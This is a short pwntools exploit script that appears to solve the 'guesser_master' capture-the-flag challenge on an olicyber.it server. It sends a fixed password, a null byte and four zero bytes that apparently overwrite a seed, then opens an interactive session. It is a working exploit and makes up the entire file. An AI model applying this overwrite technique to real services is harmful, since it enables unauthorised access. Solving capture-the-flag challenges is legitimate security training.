from pwn import *

exe = ELF("./guesser_master")

context.binary = exe

HOST = "guessermaster.challs.olicyber.it"
PORT = 35006

gdbscript = """
set follow-fork-mode child
# set print elements 0
b *main+0xfa
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

PASSWORD = b"ILCPSKLRYVMCPJNBPBWLLSREHFMXRKECWITRSGLREXVTJMXYPUNBQFGXMUVGFAJCLFVENHYUHUORJOSAMIBDNJDBEYHKBSOMBLTOUUJDRBWCRRCGBFLQPOTTPEGRWVGAJCRGWDLPGITYDVHEDTUSIPPYVXSUVBVFENODQASAJOYOMGSQCPJLHBMDAHYVIUEMKSSDSLDEBESNNNGPESDNTRRVYSUIPYWATPFOELTHROWHFEXLWDYSVSPWLKFBLFD\x00"

SEED = b"\x00" * 4

def main():
    r = conn()
    r.sendline(PASSWORD + SEED)
    r.interactive()

if __name__ == "__main__":
    main()
